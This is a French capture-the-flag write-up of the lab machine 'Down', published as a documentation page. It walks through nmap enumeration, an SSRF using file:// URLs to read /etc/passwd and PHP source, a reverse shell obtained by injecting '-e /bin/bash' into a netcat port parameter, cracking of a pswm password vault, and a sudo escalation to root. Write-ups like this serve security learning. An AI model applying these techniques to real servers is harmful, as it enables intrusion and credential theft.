@@ -1,0 +1,199 @@
+---
+title: Down
+description: WU Down
+categories: [Writeup]
+tags: [writeup]
+template: doc
+sidebar:
+  order: 9 
+  badge:
+    text: 'Easy'
+    variant: 'success'
+---
+import { Image } from 'astro:assets';
+import banner from '../../../../assets/writeup/vulnlab/banner.jpeg';
+
+<Image src={banner} alt="banner" format="avif" quality={"mid"}/>
+
+# Down
+
+| OS | Difficulty | Target |
+|----|----|----|
+| Linux | <span style="color:green">**Easy**</span> | 10.10.74.15 |
+
+## 🔭 Enumeration
+```sh
+nmap -sC -sV -Pn down.vl  
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-10 09:22 CET
+Nmap scan report for down.vl (10.10.74.15)
+Host is up (0.018s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 f6cc217ccadaed34fd04efe6f94cddf8 (ECDSA)
+|_  256 fa061ff4bf8ce3b0c840210d5706dd11 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Is it down or just me?
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.45 seconds
+```
+Nous sommes sur un site demandant de saisir une URL.
+cURL est utilisé par le site en question. Nous tentons de faire des requêtes en ajoutant `file:///`
+
+```sh
+http://localhost/index.php file:///etc/passwd
+
+# La lecture du fichier passwd est effectuée
+
+It is up. It's just you! 😝
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Is it down or just me?</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <header>
+        <img src="/logo.png" alt="Logo">
+        <h2>Is it down or just me?</h2>
+    </header>
+
+    <div class="container">
+
+<h1>Is that website down, or is it just you?</h1>
+        <form id="urlForm" action="index.php" method="POST">
+            <input type="url" id="url" name="url" placeholder="Please enter a URL." required><br>
+            <button type="submit">Is it down?</button>
+        </form>
+</div>
+</div>
+<footer>© 2024 isitdownorjustme LLC</footer>
+</body>
+</html>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+aleks:x:1000:1000:Aleks:/home/aleks:/bin/bash
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+```
+Voyons ce que nous donne le code source de la page index située `var/www/html/index.php`.
+```sh
+http://localhost file:///var/www/html/index.php
+
+#Le code source nous donne la possibilité d'utilisé le paramètre `expertmode` et donnant ainsi la possibilité d'obtenir un reverse shell.
+
+if ( isset($_GET['expertmode']) && $_GET['expertmode'] === 'tcp' && isset($_POST['ip']) && isset($_POST['port']) ) {
+  $ip = trim($_POST['ip']);
+  $valid_ip = filter_var($ip, FILTER_VALIDATE_IP);
+  $port = trim($_POST['port']);
+  $port_int = intval($port);
+  $valid_port = filter_var($port_int, FILTER_VALIDATE_INT);
+```
+## 👣 Foothold
+
+L'obtention du reverse shell se fera via la page `index.php?expertmode=tcp`, en utilisant burpsuite nous pouvons ajouter  `+-e+/bin/bash` au port de notre `nc`.
+Le flag user se situe dans le dossier `/html`.
+Lors de la phase d'énumération nous avons pu voir un user `aleks`, nous nous rendons dans son répertoire et cherchons ce qui est exploitable. 
+```shell
+cd aleks
+ls -lah
+total 32K
+drwxr-xr-x 5 aleks aleks 4.0K Sep 15 09:15 .
+drwxr-xr-x 3 root  root  4.0K Sep 13 14:43 ..
+lrwxrwxrwx 1 aleks aleks    9 Sep  6 14:43 .bash_history -> /dev/null
+-rw-r--r-- 1 aleks aleks  220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 aleks aleks 3.7K Jan  6  2022 .bashrc
+drwx------ 2 aleks aleks 4.0K Sep  6 15:03 .cache
+drwxrwxr-x 3 aleks aleks 4.0K Sep  6 14:45 .local
+-rw-r--r-- 1 aleks aleks  807 Jan  6  2022 .profile
+drwx------ 2 aleks aleks 4.0K Sep  6 14:42 .ssh
+-rw-r--r-- 1 aleks aleks    0 Sep 15 09:15 .sudo_as_admin_successful
+cd .local
+ls -lah
+total 12K
+drwxrwxr-x 3 aleks aleks 4.0K Sep  6 14:45 .
+drwxr-xr-x 5 aleks aleks 4.0K Sep 15 09:15 ..
+drwxrwxr-x 3 aleks aleks 4.0K Sep 13 15:36 share
+cd share
+ls
+pswm
+cd pswm
+file pswm
+pswm: ASCII text, with no line terminators
+cat pswm
+e9laWoKiJ0OdwK0<REDACTED>BFaKEviDCHBQ==
+```
+Nous trouvons ce qui semble être un hash créé par `pswm`. Nous utilisons le script `pswm-decryptor`:
+
+python3 pswm-decryptor.py -f pswm.txt -w /usr/share/wordlists/rockyou.txt 
+[+] Master Password: flower
+[+] Decrypted Data:
++------------+----------+----------------------+
+| Alias      | Username | Password             |
++------------+----------+----------------------+
+| pswm       | aleks    | f----r               |
+| aleks@down | aleks    | 1u-----E |
++------------+----------+----------------------+
+
+
+## 🎯 Privilege Escalation
+
+Le mot de passe de `aleks` obtenu, nous nous connectons sur cet user. 
+```shell
+script -qc /bin/bash /dev/null
+www-data@down:/home/aleks/.local/share/pswm$ su aleks
+su aleks
+Password: 1u<REDACTED>E          
+
+aleks@down:~/.local/share/pswm$ sudo -l
+sudo -l
+[sudo] password for aleks: 1u<REDACTED>E
+
+Matching Defaults entries for aleks on down:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User aleks may run the following commands on down:
+    (ALL : ALL) ALL
+aleks@down:~/.local/share/pswm$ sudo su
+sudo su
+root@down:/home/aleks/.local/share/pswm# cat /root/root.txt
+```
